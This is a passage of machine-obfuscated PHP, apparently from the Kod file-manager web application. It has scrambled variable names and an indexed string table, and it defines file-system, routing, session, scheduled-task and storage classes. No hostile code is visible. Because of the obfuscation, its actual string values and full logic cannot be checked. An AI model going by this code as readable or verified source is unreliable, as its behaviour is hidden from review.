$î¡¤©Å¥[1474] => @fileatime($œ¤¹ëÏ¢), $î¡¤©Å¥[79] => $this->size($œ¤¹ëÏ¢), $î¡¤©Å¥[169] => $this->ext($“¹‹‰²„), $î¡¤©Å¥[1475] => is_readable($œ¤¹ëÏ¢), $î¡¤©Å¥[1476] => is_writable($œ¤¹ëÏ¢), $î¡¤©Å¥[1477] => get_mode($œ¤¹ëÏ¢)); return $Ò±§»ãÑ; } public function exist($‰Ü «­‹) { $‰Ü «­‹ = $this->iconvSystem($‰Ü «­‹); return @file_exists($‰Ü «­‹); } public function isFile($®ƒ‘•É) { $®ƒ‘•É = $this->iconvSystem($®ƒ‘•É); return @is_file($®ƒ‘•É); } public function isFolder($ŸÙ’Á´) { $ŸÙ’Á´ = $this->iconvSystem($ŸÙ’Á´); return @is_dir($ŸÙ’Á´); } public function listPath($Şö—Ş§, $½Ïò‘˜Š = false) { $Ê¤”¹ =& $_SERVER[¼¥ÊĞÙÌ]; $Şö—Ş§ = $this->iconvSystem($Şö—Ş§); $Şö—Ş§ = rtrim($Şö—Ş§, $Ê¤”¹[8]) . $Ê¤”¹[8]; $ŸÁâæº = array($Ê¤”¹[85] => array(), $Ê¤”¹[86] => array()); if (!($¬ïÇÒê = @opendir($Şö—Ş§))) { return $ŸÁâæº; } while (($ñ¢Æü = readdir($¬ïÇÒê)) !== !1) { if ($ñ¢Æü == $Ê¤”¹[10] || $ñ¢Æü == $Ê¤”¹[1375]) { continue; } $¢Ş©¯ÌÉ = $Şö—Ş§ . $ñ¢Æü; if (is_file($¢Ş©¯ÌÉ)) { $ŸÁâæº[$Ê¤”¹[86]][] = $this->fileInfo($¢Ş©¯ÌÉ, $½Ïò‘˜Š); } else { $ŸÁâæº[$Ê¤”¹[85]][] = $this->folderInfo($¢Ş©¯ÌÉ, $½Ïò‘˜Š); } } closedir($¬ïÇÒê); return $ŸÁâæº; } public function listAll($ ìÁÅÀ™, &$²Ì€«¦Ò = array()) { $¨üÎ¨Âã =& $_SERVER[¼¥ÊĞÙÌ]; $ ìÁÅÀ™ = $this->iconvSystem($ ìÁÅÀ™); $ ìÁÅÀ™ = rtrim($ ìÁÅÀ™, $¨üÎ¨Âã[8]) . $¨üÎ¨Âã[8]; if (!($…²û—˜ƒ = @opendir($ ìÁÅÀ™))) { return $²Ì€«¦Ò; } while (($´ùÓõæ¸ = readdir($…²û—˜ƒ)) !== !1) { if ($´ùÓõæ¸ == $¨üÎ¨Âã[10] || $´ùÓõæ¸ == $¨üÎ¨Âã[1375]) { continue; } $¨Ú‹´İ´ = $ ìÁÅÀ™ . $´ùÓõæ¸; $É¦­‚“ı = is_dir($¨Ú‹´İ´) && !is_link($¨Ú‹´İ´) ? 1 : 0; $¨Ú‹´İ´ = $É¦­‚“ı ? $¨Ú‹´İ´ . $¨üÎ¨Âã[8] : $¨Ú‹´İ´; $²Ì€«¦Ò[] = array($¨üÎ¨Âã[87] => $this->getPathOuter($¨Ú‹´İ´), $¨üÎ¨Âã[78] => $É¦­‚“ı, $¨üÎ¨Âã[88] => intval(@filemtime($¨Ú‹´İ´)), $¨üÎ¨Âã[79] => $É¦­‚“ı ? 0 : intval($this->size($¨Ú‹´İ´))); if ($É¦­‚“ı) { $this->listAll($¨Ú‹´İ´, $²Ì€«¦Ò); } } closedir($…²û—˜ƒ); return $²Ì€«¦Ò; } public function has($İ°¡ê‰ƒ, $ŞİùÂúÊ = false, $¥Äş›Ïù = true) { $×åã¨…Ø =& $_SERVER[¼¥ÊĞÙÌ]; $İ°¡ê‰ƒ = $this->iconvSystem($İ°¡ê‰ƒ); $İ°¡ê‰ƒ = rtrim($İ°¡ê‰ƒ, $×åã¨…Ø[8]) . $×åã¨…Ø[8]; if (!($õŸ¨ÀÉ = @opendir($İ°¡ê‰ƒ))) { return !1; } $ŸÚÍ„Ñ = 0; $„ä×ù¹Í = 0; $ÃÙ¿…ë¤ = 0; while (($é·»§ùû = readdir($õŸ¨ÀÉ)) !== !1) { if ($é·»§ùû == $×åã¨…Ø[10] || $é·»§ùû == $×åã¨…Ø[1375]) { continue; } $Ã—¯©ç = $İ°¡ê‰ƒ . $é·»§ùû; if ($ŞİùÂúÊ) { $ÃÙ¿…ë¤++; if (@is_file($Ã—¯©ç)) { $ŸÚÍ„Ñ++; } else { $„ä×ù¹Í++; } if ($ÃÙ¿…ë¤ > 10000) { break; } continue; } if ($¥Äş›Ïù) { if (@is_file($Ã—¯©ç)) { return !0; } } else { if (@is_dir($Ã—¯©ç . $×åã¨…Ø[8])) { return !0; } } } closedir($õŸ¨ÀÉ); if ($ŞİùÂúÊ) { return array($×åã¨…Ø[242] => $ŸÚÍ„Ñ, $×åã¨…Ø[243] => $„ä×ù¹Í); } return !1; } public function hashSimple($ÚïÍ•Ğ) { $°´¯ûù¶ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$ÚïÍ•Ğ) { return md5($°´¯ûù¶[12]); } $ÚïÍ•Ğ = $this->iconvSystem($ÚïÍ•Ğ); $Èü¹«ñ¡ = $this->size($ÚïÍ•Ğ); $ÉÜÂõ™ã = 200; $ä…Ã«‹ = 50; if ($Èü¹«ñ¡ <= $ÉÜÂõ™ã * $ä…Ã«‹) { return $this->hashMd5($ÚïÍ•Ğ) . $Èü¹«ñ¡; } $ßòÕÍµ = $°´¯ûù¶[12]; $íÃöşúø = intval($Èü¹«ñ¡ / $ä…Ã«‹); $ÆóÜì„‡ = fopen($ÚïÍ•Ğ, $°´¯ûù¶[1478]); if (!$ÆóÜì„‡) { return $ßòÕÍµ; } for ($ù™êÚÍš = 0; $ù™êÚÍš < $ä…Ã«‹; $ù™êÚÍš++) { fseek_64($ÆóÜì„‡, $íÃöşúø * $ù™êÚÍš); $ßòÕÍµ .= fread($ÆóÜì„‡, $ÉÜÂõ™ã); } fseek_64($ÆóÜì„‡, $Èü¹«ñ¡ - $ÉÜÂõ™ã); $ßòÕÍµ .= fread($ÆóÜì„‡, $ÉÜÂõ™ã); fclose($ÆóÜì„‡); return md5($ßòÕÍµ) . $Èü¹«ñ¡; } public function getContent($Ø¹æÊ‹) { $Ø¹æÊ‹ = $this->iconvSystem($Ø¹æÊ‹); return file_get_contents($Ø¹æÊ‹); } public function setContent($°Ø•È¢´, $ÏÇ‘ë£Š = '') { $°Ø•È¢´ = $this->iconvSystem($°Ø•È¢´); $ÂÍ¿Ú¶ = @file_put_contents($°Ø•È¢´, $ÏÇ‘ë£Š, LOCK_EX); if (!$ÂÍ¿Ú¶) { $this->writeLog(__FUNCTION__ . $_SERVER[¼¥ÊĞÙÌ][1470], !0); } clearstatcache(); @chmod($°Ø•È¢´, $this->pathAuth); return $ÂÍ¿Ú¶ === !1 ? !1 : !0; } public function fileSubstr($Õ ¬Û•, $ìÉ¢Â’Æ = 0, $±ø”‚ ê = false) { $¤„³¶¶ù =& $_SERVER[¼¥ÊĞÙÌ]; $Õ ¬Û• = $this->iconvSystem($Õ ¬Û•); if ($±ø”‚ ê === !1) { $±ø”‚ ê = $this->size($Õ ¬Û•); } if ($±ø”‚ ê <= 0) { return $¤„³¶¶ù[12]; } $îÛÙô‹ò = fopen($Õ ¬Û•, $¤„³¶¶ù[1478]); if (!$îÛÙô‹ò) { return !1; } fseek_64($îÛÙô‹ò, $ìÉ¢Â’Æ); $äˆÇå“ï = fread($îÛÙô‹ò, $±ø”‚ ê); fclose($îÛÙô‹ò); if (!$äˆÇå“ï) { $this->writeLog(__FUNCTION__ . $¤„³¶¶ù[1470], !0); } return $äˆÇå“ï; } public function upload($··ßıùú, $­æ¥ÆÎ, $®Ï÷ÁÈÎ = false, $Ší¸» = REPEAT_REPLACE) { if ($®Ï÷ÁÈÎ) { return $this->moveFile($­æ¥ÆÎ, $··ßıùú); } return $this->copyFile($­æ¥ÆÎ, $··ßıùú); } public function setModifyTime($è­‰ì¼„, $–©±ûÈ = '') { @touch($è­‰ì¼„, intval($–©±ûÈ)); } public function download($Ş¯ÒÄ½, $‘™Ø¬åŒ) { return $this->iconvSystem($Ş¯ÒÄ½); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($“·¬›šû) { parent::__construct($“·¬›šû); $this->setSignVersion($_SERVER[¼¥ÊĞÙÌ][250]); } public function fileOutImage($Îñ·ËŒ, $¾ƒÌ±Š› = 250) { $É¦‰ß° =& $_SERVER[¼¥ÊĞÙÌ]; if ($this->size($Îñ·ËŒ) > 1024 * 1024 * 25) { return $this->fileOutImageServer($Îñ·ËŒ, $¾ƒÌ±Š›); } $í±„³Õ = array($É¦‰ß°[1479] => $É¦‰ß°[1480] . $¾ƒÌ±Š› . $É¦‰ß°[1481]); $Õ°¥¬Èœ = $this->link($Îñ·ËŒ, $í±„³Õ); $this->fileOutLink($Õ°¥¬Èœ); } } goto C¢ôï’à…‰; E¡ÓÏ¢‡ãØ: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\x6e\171" => "\133\136\57\135\53", "\72\x6e\165\x6d" => "\x5b\60\x2d\71\x5d\x2b", "\x3a\141\x6c\154" => "\56\52"); public static $errorCallback; public static function __callstatic($£Å·Û°Ì, $´¾×¡ƒ·) { $ïõ»†»Ï =& $_SERVER[¼¥ÊĞÙÌ]; if ($£Å·Û°Ì == $ïõ»†»Ï[1725]) { $ÌÛàÆëæ = array_map($ïõ»†»Ï[1726], $´¾×¡ƒ·[0]); $„Ù²¡× = strpos($´¾×¡ƒ·[1], $ïõ»†»Ï[8]) === 0 ? $´¾×¡ƒ·[1] : $ïõ»†»Ï[8] . $´¾×¡ƒ·[1]; $Ï§‚´ñà = $´¾×¡ƒ·[2]; } else { $ÌÛàÆëæ = null; $„Ù²¡× = strpos($´¾×¡ƒ·[0], $ïõ»†»Ï[8]) === 0 ? $´¾×¡ƒ·[0] : $ïõ»†»Ï[8] . $´¾×¡ƒ·[0]; $Ï§‚´ñà = $´¾×¡ƒ·[1]; } array_push(self::$maps, $ÌÛàÆëæ); array_push(self::$routes, $„Ù²¡×); array_push(self::$methods, strtoupper($£Å·Û°Ì)); array_push(self::$callbacks, $Ï§‚´ñà); } public static function error($îÛÃÜ´) { self::$errorCallback = $îÛÃÜ´; } public static function haltOnMatch($Ò˜°şıŸ = true) { self::$halts = $Ò˜°şıŸ; } public static function dispatch() { $¯æ÷£èš =& $_SERVER[¼¥ÊĞÙÌ]; $‹Ó¶×§Ä = parse_url($_SERVER[$¯æ÷£èš[1727]], PHP_URL_PATH); $åı†ü³ó = $_SERVER[$¯æ÷£èš[164]]; $¿÷â¨˜İ = array_keys(static::$patterns); $§ÑÉ¹¶‚ = array_values(static::$patterns); $ÔŞûşÔÚ = !1; self::$routes = preg_replace($¯æ÷£èš[1373], $¯æ÷£èš[8], self::$routes); if (in_array($‹Ó¶×§Ä, self::$routes)) { $§Õ´Ëü¢ = array_keys(self::$routes, $‹Ó¶×§Ä); foreach ($§Õ´Ëü¢ as $“Ü£ğ®Ä) { if (self::$methods[$“Ü£ğ®Ä] == $åı†ü³ó || self::$methods[$“Ü£ğ®Ä] == $¯æ÷£èš[1728] || in_array($åı†ü³ó, self::$maps[$“Ü£ğ®Ä])) { $ÔŞûşÔÚ = !0; if (!is_object(self::$callbacks[$“Ü£ğ®Ä])) { $§ø¿ÛŒÂ = explode($¯æ÷£èš[8], self::$callbacks[$“Ü£ğ®Ä]); $šµ²°‹ = end($§ø¿ÛŒÂ); $š½ÑÃ• = explode($¯æ÷£èš[1305], $šµ²°‹); $ößÊåÜ = new $š½ÑÃ•[0](); $ößÊåÜ->{$š½ÑÃ•[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$“Ü£ğ®Ä]); if (self::$halts) { return; } } } } } else { $ØÛÉ‹‚è = 0; foreach (self::$routes as $“Ü£ğ®Ä) { if (strpos($“Ü£ğ®Ä, $¯æ÷£èš[4]) !== !1) { $“Ü£ğ®Ä = str_replace($¿÷â¨˜İ, $§ÑÉ¹¶‚, $“Ü£ğ®Ä); } if (preg_match($¯æ÷£èš[1729] . $“Ü£ğ®Ä . $¯æ÷£èš[1730], $‹Ó¶×§Ä, $Û¯ıŸÏÔ)) { if (self::$methods[$ØÛÉ‹‚è] == $åı†ü³ó || self::$methods[$ØÛÉ‹‚è] == $¯æ÷£èš[1728] || !empty(self::$maps[$ØÛÉ‹‚è]) && in_array($åı†ü³ó, self::$maps[$ØÛÉ‹‚è])) { $ÔŞûşÔÚ = !0; array_shift($Û¯ıŸÏÔ); if (!is_object(self::$callbacks[$ØÛÉ‹‚è])) { $§ø¿ÛŒÂ = explode($¯æ÷£èš[8], self::$callbacks[$ØÛÉ‹‚è]); $šµ²°‹ = end($§ø¿ÛŒÂ); $š½ÑÃ• = explode($¯æ÷£èš[1305], $šµ²°‹); $ößÊåÜ = new $š½ÑÃ•[0](); if (!method_exists($ößÊåÜ, $š½ÑÃ•[1])) { echo $¯æ÷£èš[1731]; } else { call_user_func_array(array($ößÊåÜ, $š½ÑÃ•[1]), $Û¯ıŸÏÔ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ØÛÉ‹‚è], $Û¯ıŸÏÔ); if (self::$halts) { return; } } } } $ØÛÉ‹‚è++; } } if ($ÔŞûşÔÚ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $¤Î¢š¦Á =& $_SERVER[¼¥ÊĞÙÌ]; header($_SERVER[$¤Î¢š¦Á[1732]] . $¤Î¢š¦Á[1733]); echo $¤Î¢š¦Á[1734]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$¯æ÷£èš[1727]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $ˆøÃåíÆ =& $_SERVER[¼¥ÊĞÙÌ]; static $ß‡Ô¡Ãô = false; if ($ß‡Ô¡Ãô) { return $ß‡Ô¡Ãô; } $ƒ«ˆàöö = $GLOBALS[$ˆøÃåíÆ[6]][$ˆøÃåíÆ[427]]; self::$sessionTime = $ƒ«ˆàöö[$ˆøÃåíÆ[1735]]; $æÓÌïĞ = isset($GLOBALS[$ˆøÃåíÆ[1736]]) ? $GLOBALS[$ˆøÃåíÆ[1736]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($æÓÌïĞ)) { self::$sessionSign = Cookie::get($æÓÌïĞ); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($æÓÌïĞ, self::$sessionSign, self::$sessionTime); $šÇÑ×Ìş = $ƒ«ˆàöö[$ˆøÃåíÆ[1737]]; $òãÆ¨ÉŒ = $ƒ«ˆàöö[$šÇÑ×Ìş]; $éæĞßìÕ = $ƒ«ˆàöö[$ˆøÃåíÆ[907]]; switch ($šÇÑ×Ìş) { case $ˆøÃåíÆ[21]: self::$handle = Model($ˆøÃåíÆ[908]); break; case $ˆøÃåíÆ[909]: self::$handle = new CacheRedis($òãÆ¨ÉŒ, $éæĞßìÕ); break; case $ˆøÃåíÆ[910]: self::$handle = new CacheMemcached($òãÆ¨ÉŒ, $éæĞßìÕ); break; case $ˆøÃåíÆ[233]: $òãÆ¨ÉŒ[$ˆøÃåíÆ[87]] = $òãÆ¨ÉŒ[$ˆøÃåíÆ[87]] . $ˆøÃåíÆ[1738]; self::$handle = new CacheFile($òãÆ¨ÉŒ, $éæĞßìÕ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ß‡Ô¡Ãô = new self(); return $ß‡Ô¡Ãô; } public static function getBySign($£´‘¡ËÃ) { $„é©˜ò´ = self::$handle->get($£´‘¡ËÃ); $„é©˜ò´ = unserialize($„é©˜ò´); return is_array($„é©˜ò´) ? $„é©˜ò´ : array(); } public static function setBySign($ğòğ­˜ï, $ñõÑØˆ‚) { CacheLock::lock($ğòğ­˜ï); self::$handle->set($ğòğ­˜ï, serialize($ñõÑØˆ‚), self::$sessionTime); CacheLock::unlock($ğòğ­˜ï); } public static function sign($¯é¬ó¬³ = false) { if ($¯é¬ó¬³) { self::$sessionSign = $¯é¬ó¬³; } self::init(); return self::$sessionSign; } public static function set($‘Ò¹ª¿¹, $•ª¡˜á = false) { self::init(); if (is_array($‘Ò¹ª¿¹)) { foreach ($‘Ò¹ª¿¹ as $ÉŒ–ëÊ => $åÈÊëâú) { array_set_value(self::$data, $ÉŒ–ëÊ, $åÈÊëâú); } } else { array_set_value(self::$data, $‘Ò¹ª¿¹, $•ª¡˜á); } self::setBySign(self::$sessionSign, self::$data); } public static function get($»£ËêĞ = false) { self::init(); if (!$»£ËêĞ) { return self::$data; } return array_get_value(self::$data, $»£ËêĞ); } public static function remove($ÌûŞ—ˆø) { self::init(); unset(self::$data[$ÌûŞ—ˆø]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¼¥ÊĞÙÌ][913])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $“Ø´Ÿ¡ =& $_SERVER[¼¥ÊĞÙÌ]; if (self::valueGet($“Ø´Ÿ¡[824]) != $“Ø´Ÿ¡[91]) { return; } if (self::valueGet($“Ø´Ÿ¡[1739]) == $“Ø´Ÿ¡[91]) { $ãò¡—¼ª = self::valueGet($“Ø´Ÿ¡[1740]); if (time() - $ãò¡—¼ª > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($“Ø´Ÿ¡[1739], $“Ø´Ÿ¡[91]); self::log($“Ø´Ÿ¡[1741] . ACTION . $“Ø´Ÿ¡[1742]); Hook::bind($“Ø´Ÿ¡[1743], $“Ø´Ÿ¡[1744]); $¤®Ó£« = 0; while (!0) { self::cacheClear(); if (self::valueGet($“Ø´Ÿ¡[824]) != $“Ø´Ÿ¡[91]) { self::valueSet($“Ø´Ÿ¡[1739], $“Ø´Ÿ¡[231]); self::log($“Ø´Ÿ¡[1745]); die; } $­¬ïé¸ = time(); if ($­¬ïé¸ - $¤®Ó£« >= 60) { self::valueSet(array($“Ø´Ÿ¡[1739] => $“Ø´Ÿ¡[91], $“Ø´Ÿ¡[1740] => $­¬ïé¸)); $¤®Ó£« = $­¬ïé¸; } if (!file_exists(USER_SYSTEM . $“Ø´Ÿ¡[1746])) { self::valueSet(array($“Ø´Ÿ¡[1739] => $“Ø´Ÿ¡[231], $“Ø´Ÿ¡[824] => $“Ø´Ÿ¡[231])); self::log($“Ø´Ÿ¡[1747]); die; } $ºÂ—¹ÅÇ = file_get_contents(BASIC_PATH . $“Ø´Ÿ¡[1748]); $Ÿ¹äˆÁ½ = KOD_VERSION . $“Ø´Ÿ¡[10] . KOD_VERSION_BUILD; $…ø†Îšı = match_text($ºÂ—¹ÅÇ, $“Ø´Ÿ¡[1749]) . $“Ø´Ÿ¡[10] . match_text($ºÂ—¹ÅÇ, $“Ø´Ÿ¡[1750]); if ($…ø†Îšı != $Ÿ¹äˆÁ½) { self::restart(); self::log("\163\x74\157\160\145\x64\56\133\166\145\162\163\x69\157\156\x20\165\160\144\141\164\145\x3b{$versionNow}\x20\75\x3e\40{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $µ¡¼éñÏ =& $_SERVER[¼¥ÊĞÙÌ]; http_close(); $GLOBALS[$µ¡¼éñÏ[1751]] = 1; $_SERVER[$µ¡¼éñÏ[1752]] = $µ¡¼éñÏ[1753]; $_COOKIE = array(); $GLOBALS[$µ¡¼éñÏ[1754]] = 1; $GLOBALS[$µ¡¼éñÏ[1755]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $°íø•¤Ñ =& $_SERVER[¼¥ÊĞÙÌ]; http_close(); self::valueSet($°íø•¤Ñ[824], $°íø•¤Ñ[231]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($°íø•¤Ñ[1739] => $°íø•¤Ñ[231], $°íø•¤Ñ[824] => $°íø•¤Ñ[91])); self::log($°íø•¤Ñ[1756]); } public static function taskSwitch() { $ÁØæºúå =& $_SERVER[¼¥ÊĞÙÌ]; $Ë³‰¿Ë¸ = self::valueGet($ÁØæºúå[824]) == $ÁØæºúå[91] ? $ÁØæºúå[231] : $ÁØæºúå[91]; self::valueSet($ÁØæºúå[824], $Ë³‰¿Ë¸); } public static function shutdownEvent() { $ç ‹ŞÃé =& $_SERVER[¼¥ÊĞÙÌ]; self::valueSet($ç ‹ŞÃé[1739], $ç ‹ŞÃé[231]); self::log($ç ‹ŞÃé[1757]); } public static function config($„‡ÉÌ¸, $¡Ì®ŞÖß) { self::valueSet($_SERVER[¼¥ÊĞÙÌ][824], $„‡ÉÌ¸); } private static function taskRunAll() { $ÊŸú‡ïš =& $_SERVER[¼¥ÊĞÙÌ]; $ù‘€İÀ’ = timeFloat(); $—¦ùÉåê = Model($ÊŸú‡ïš[1758])->listData(); $ÔÖãã™– = count($—¦ùÉåê); for ($•Â‰æ¦ä = 0; $•Â‰æ¦ä < $ÔÖãã™–; $•Â‰æ¦ä++) { $¢Ë„¡ûƒ = $—¦ùÉåê[$•Â‰æ¦ä]; if (!$¢Ë„¡ûƒ[$ÊŸú‡ïš[478]] || $¢Ë„¡ûƒ[$ÊŸú‡ïš[1759]] != $ÊŸú‡ïš[91]) { continue; } if (!self::taskTimeCheck($¢Ë„¡ûƒ)) { continue; } self::taskRun($¢Ë„¡ûƒ); } Hook::trigger($ÊŸú‡ïš[1760]); self::taskQueueRun($ù‘€İÀ’); } private static function taskQueueRun($Â«ó×™É) { $ÁÍ€ç—Ï = 10; while (!0) { $´õ¼ÔÔå = TaskQueue::run(); if ($´õ¼ÔÔå === !1) { break; } if (timeFloat() - $Â«ó×™É >= $ÁÍ€ç—Ï) { break; } } } private static function taskTimeCheck($éêˆÀºæ) { $Ú›°¦×˜ =& $_SERVER[¼¥ÊĞÙÌ]; $ó´ÇŒÃ = json_decode($éêˆÀºæ[$Ú›°¦×˜[207]], !0); $°ïÒ”õ = intval($éêˆÀºæ[$Ú›°¦×˜[1740]]); $âŸúŠ²¯ = strtotime($Ú›°¦×˜[1761] . $ó´ÇŒÃ[$Ú›°¦×˜[1762]] . $Ú›°¦×˜[1763]) - strtotime($Ú›°¦×˜[1764]); $ºÄö¤­ = time() - strtotime(date($Ú›°¦×˜[1765]) . $Ú›°¦×˜[1766]); $˜íê”Õ = $ºÄö¤­ >= $âŸúŠ²¯ && $ºÄö¤­ <= $âŸúŠ²¯ + 3600; switch ($ó´ÇŒÃ[$Ú›°¦×˜[33]]) { case $Ú›°¦×˜[1767]: if (time() - $°ïÒ”õ < 3600 * 24 * 30) { return !1; } if ($ó´ÇŒÃ[$Ú›°¦×˜[1767]] == date($Ú›°¦×˜[1768]) && $˜íê”Õ) { return !0; } break; case $Ú›°¦×˜[1769]: if (time() - $°ïÒ”õ < 3600 * 24 * 7) { return !1; } $ŞóÔÏİ = date($Ú›°¦×˜[1770]) == 0 ? 7 : date($Ú›°¦×˜[1770]); if ($ó´ÇŒÃ[$Ú›°¦×˜[1769]] == $ŞóÔÏİ && $˜íê”Õ) { return !0; } break; case $Ú›°¦×˜[1762]: if (time() - $°ïÒ”õ < 3600 * 24) { return !1; } if ($˜íê”Õ) { return !0; } break; case $Ú›°¦×˜[1771]: if (time() - $°ïÒ”õ >= floatval($ó´ÇŒÃ[$Ú›°¦×˜[1771]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $úî í‹Í =& $_SERVER[¼¥ÊĞÙÌ]; static $‡§æ¼£Ş = 0; $ìÂ«ü“æ = 300; if (!$‡§æ¼£Ş) { $‡§æ¼£Ş = time(); } if (time() - $‡§æ¼£Ş < $ìÂ«ü“æ) { return; } $‡§æ¼£Ş = time(); $¶ ûíº¿ = Model($úî í‹Í[582])->db($úî í‹Í[12]); if ($¶ ûíº¿) { $¶ ûíº¿->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($úî í‹Í[1772], $úî í‹Í[1773]); die; } } public static function taskRun($£Ğß·¹) { $úØˆÛ¹ =& $_SERVER[¼¥ÊĞÙÌ]; self::log($úØˆÛ¹[1774] . $£Ğß·¹[$úØˆÛ¹[478]] . $úØˆÛ¹[1775] . $£Ğß·¹[$úØˆÛ¹[32]] . $úØˆÛ¹[1776] . $£Ğß·¹[$úØˆÛ¹[1777]]); Model($úØˆÛ¹[1758])->run($£Ğß·¹[$úØˆÛ¹[478]]); $Úøœ’ØÔ = timeFloat(); $Ü§à¶ıù = $úØˆÛ¹[12]; switch ($£Ğß·¹[$úØˆÛ¹[33]]) { case $úØˆÛ¹[385]: $¡ëùÙ˜ = url_request($£Ğß·¹[$úØˆÛ¹[1777]], $úØˆÛ¹[1515], !1, !1, !1, !1, 10); if ($¡ëùÙ˜[$úØˆÛ¹[824]]) { $Ü§à¶ıù = strlen($¡ëùÙ˜[$úØˆÛ¹[1299]]); } break; case $úØˆÛ¹[1778]: $Ü§à¶ıù = Hook::apply($£Ğß·¹[$úØˆÛ¹[1777]]); default: break; } Model($úØˆÛ¹[1779])->add(array($úØˆÛ¹[1780] => $úØˆÛ¹[12], $úØˆÛ¹[1781] => $úØˆÛ¹[231], $úØˆÛ¹[33] => $úØˆÛ¹[1782] . $£Ğß·¹[$úØˆÛ¹[478]], $úØˆÛ¹[1783] => json_encode(array($úØˆÛ¹[32] => $£Ğß·¹[$úØˆÛ¹[32]], $úØˆÛ¹[1784] => timeFloat() - $Úøœ’ØÔ, $úØˆÛ¹[371] => $Ü§à¶ıù)))); $æŠìÆÔ = $Ü§à¶ıù ? $úØˆÛ¹[1785] . $Ü§à¶ıù : $úØˆÛ¹[12]; self::log($úØˆÛ¹[1786] . $£Ğß·¹[$úØˆÛ¹[478]] . $úØˆÛ¹[178] . $æŠìÆÔ); return !0; } public static function valueGet($¡Ê¤«ƒ) { $ÔŠÙ¾·Â =& $_SERVER[¼¥ÊĞÙÌ]; $ú³ÂÄğÙ = $ÔŠÙ¾·Â[1787]; $äš‘‰²‹ = Model($ÔŠÙ¾·Â[511])->get($¡Ê¤«ƒ, $ú³ÂÄğÙ); if (is_null($äš‘‰²‹)) { Model($ÔŠÙ¾·Â[511])->set($ÔŠÙ¾·Â[824], $ÔŠÙ¾·Â[91], $ú³ÂÄğÙ); Model($ÔŠÙ¾·Â[511])->set($ÔŠÙ¾·Â[1739], $ÔŠÙ¾·Â[231], $ú³ÂÄğÙ); $äš‘‰²‹ = Model($ÔŠÙ¾·Â[511])->get($¡Ê¤«ƒ, $ú³ÂÄğÙ); } return $äš‘‰²‹; } private static function valueSet($§ØØàÆ©, $ÖÌ˜Àà× = false) { $İÈÁöµ› =& $_SERVER[¼¥ÊĞÙÌ]; $Ó¨Ãï¿ì = $İÈÁöµ›[1788]; CacheLock::lock($Ó¨Ãï¿ì); $‚­Ë³Œ = Model($İÈÁöµ›[511])->set($§ØØàÆ©, $ÖÌ˜Àà×, $İÈÁöµ›[1787]); CacheLock::unlock($Ó¨Ãï¿ì); return $‚­Ë³Œ; } protected static function log($…œ•¼Œ¿) { write_log($…œ•¼Œ¿, $_SERVER[¼¥ÊĞÙÌ][1773]); } private static function cacheClear() { $³òìªªï =& $_SERVER[¼¥ÊĞÙÌ]; Cache::clearMemory(Model($³òìªªï[511])->cacheKey($³òìªªï[1787])); Cache::clearMemory(Model($³òìªªï[511])->cacheKey($³òìªªï[1789])); Model($³òìªªï[1758])->cacheClear(); self::closeDatabase(); } } goto fŸÁ‘ÃìÀ; cÕ«éË°ÓÇ: class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\x6d\56\163\157\x75\x72\143\145\x53\145\143\162\x65\x74\x4c\151\163\164"; public $field = array("\x73\157\165\162\x63\x65\111\x44", "\164\171\160\145\111\104", "\x63\x72\145\141\x74\x65\125\x73\x65\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\x6d\56\x73\164\157\x72\x61\147\145\x4c\151\x73\164"; public $field = array("\156\141\x6d\x65", "\163\x69\172\x65\115\x61\170", "\163\171\163\x74\x65\155", "\x64\x65\146\141\x75\154\164", "\x64\162\151\x76\145\162", "\x63\x6f\x6e\x66\151\147"); public function listData($¶´ß¬ØÀ = false, $ºæè„¥” = "\x6d\157\144\151\x66\171\124\151\155\145", $ÃÜ€›ôë = false) { $ÛíèØ¢ù =& $_SERVER[¼¥ÊĞÙÌ]; $š°»á£‰ = parent::listData($¶´ß¬ØÀ, $ºæè„¥”, $ÃÜ€›ôë); if ($¶´ß¬ØÀ) { return $š°»á£‰; } $è¾»ıòó = array(); if ($GLOBALS[$ÛíèØ¢ù[2327]]) { $è¾»ıòó = $this->ioSizeUseGet(array_to_keyvalue($š°»á£‰, $ÛíèØ¢ù[12], $ÛíèØ¢ù[478])); } foreach ($š°»á£‰ as $àëéŞÌ => $¨İÅò¨Û) { unset($š°»á£‰[$àëéŞÌ][$ÛíèØ¢ù[6]]); $š°»á£‰[$àëéŞÌ][$ÛíèØ¢ù[1980]] = isset($è¾»ıòó[$¨İÅò¨Û[$ÛíèØ¢ù[478]]]) ? $è¾»ıòó[$¨İÅò¨Û[$ÛíèØ¢ù[478]]] : 0; } return $š°»á£‰; } public function ioSizeUseGet($…ÊÈÏãÍ) { $™Ï¹é­ù =& $_SERVER[¼¥ÊĞÙÌ]; if (!$…ÊÈÏãÍ) { return array(); } $Õò„‹Ú½ = $™Ï¹é­ù[2328] . 